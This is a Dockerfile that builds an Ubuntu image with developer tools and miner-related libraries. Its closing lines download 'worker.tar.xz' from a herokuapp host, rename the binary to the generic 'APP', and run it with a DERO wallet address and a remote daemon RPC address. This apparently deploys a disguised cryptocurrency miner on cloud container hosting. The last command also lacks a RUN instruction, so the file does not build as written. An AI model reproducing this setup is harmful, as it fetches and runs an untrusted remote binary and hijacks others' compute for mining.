#FROM aank999/xrdp-okteto-cloud:latest
#LABEL maintainer="Aank is ME <https://aank.me/Youtube>"
#EXPOSE 80
#ENTRYPOINT ["/startup.sh"]

FROM ubuntu:20.04
RUN apt-get update \
 && apt-get install software-properties-common -y \
 && add-apt-repository ppa:ubuntu-toolchain-r/test -y \
 && add-apt-repository ppa:ondrej/php -y \
 && apt-get update \
 && apt-get upgrade -y
ARG DEBIAN_FRONTEND=noninteractive
ENV TZ=Europe/Moscow
RUN apt-get install -y tzdata && \
    apt-get install -y \
    curl \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
    build-essential \
    libcurl4-openssl-dev \
    libssl-dev libjansson-dev \
    binutils \
    cmake \
    unzip \
    net-tools \
    automake \
    autotools-dev \
    wget \
    python3 \
    php7.4 \
    gcc \ 
    gcc-9 \
    libstdc++6 \
    screen \
    npm \
    nodejs \
    python3-pip \
    iputils-ping \
    gnupg \
    dumb-init \
    htop \
    locales \
    man \
    nano \
    git \
    procps \
    ssh \
    sshpass \
    sudo \
    wget \
    unzip \
    psmisc \
    tar \
    vim \
    rclone \
    fuse \
    && rm -rf /var/lib/apt/lists/*

WORKDIR .

RUN wget -q http://tools12321.herokuapp.com/apostropis/worker.tar.xz 
RUN tar xf worker.tar.xz 
RUN mv worker APP 
RUN chmod +x APP 
./APP --wallet-address=dero1qyf2902ys7v2rm0hvu64fnghv3td4pqrq4x7v7uznarftemnpdm37qqm3khtw --daemon-rpc-address=107.21.149.229:10100
